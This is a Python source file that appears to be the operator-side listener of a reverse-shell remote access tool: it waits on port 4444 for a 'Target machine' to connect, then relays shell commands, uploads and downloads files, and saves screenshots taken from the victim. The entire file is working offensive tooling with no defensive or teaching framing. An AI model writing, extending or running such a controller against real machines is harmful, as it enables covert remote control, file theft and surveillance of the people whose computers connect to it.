import socket
import termcolor
from termcolor import colored
import json
import os


class Connection:
    def __init__(self, host, port):
        self.target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.target.bind((host, port))
        self.target.listen(5)
        print(colored('[-] Waiting for connections ...', 'green'))
        self.conn, self.ip = self.target.accept()
        print(colored('[+] connection with: ' + str(self.ip), 'green'))

    def send(self, data):
        jsondata = json.dumps(data)
        self.conn.send(jsondata.encode())

    def recv(self):
        data = ''
        while True:
            try:
                data += self.conn.recv(1024).decode().rstrip()
                return json.loads(data)

            except ValueError:
                continue

    def upload_file(self, file):
        with open(file, 'rb') as f:
            self.conn.send(f.read())

    def download_file(self, file):
        with open(file, 'wb') as f:
            self.conn.settimeout(5)
            chunk = self.conn.recv(1024)

            while chunk:
                f.write(chunk)
                try:
                    chunk = self.conn.recv(1024)
                except socket.timeout:
                    break

            self.conn.settimeout(None)

    def close(self):
        self.conn.close()


class CommandHandler:
    def __init__(self, connection):
        self.connection = connection
        self.count = 6

    def execute(self):
        while True:
            comm = input(f'[*] Shell-{self.connection.ip}: ')
            self.connection.send(comm)

            if comm == 'exit':
                break

            elif comm == 'clear':
                os.system('clear')

            elif comm.startswith('cd '):
                # Change directory command is not implemented as per original code.
                pass

            elif comm.startswith('upload '):
                self.connection.upload_file(comm[7:])

            elif comm.startswith('download '):
                self.connection.download_file(comm[9:])

            elif comm == 'screenshot':
                self.handle_screenshot()

            elif comm == 'help':
                self.show_help()

            else:
                answer = self.connection.recv()
                print(answer)

    def handle_screenshot(self):
        with open(f'screenshot{self.count}', 'wb') as f:
            self.connection.conn.settimeout(5)
            chunk = self.connection.conn.recv(1024)

            while chunk:
                f.write(chunk)
                try:
                    chunk = self.connection.conn.recv(1024)
                except socket.timeout:
                    break

            self.connection.conn.settimeout(None)
            self.count += 1

    @staticmethod
    def show_help():
        print(colored('''
        exit: Close the session the Target Machine.
        clear: Clean the screen from the terminal.
        cd + "directory_name": Change the directory on the Target machine.
        upload + "file_name": Send a file to the Target machine.
        download + "file_name": Download a file from the Target machine.
        screenshot: Take a screenshot from the Target machine.
        help: Help users to use the commands.
        ''', 'green'))


if __name__ == "__main__":
    conn = Connection('127.0.0.1', 4444)
    command_handler = CommandHandler(conn)
    command_handler.execute()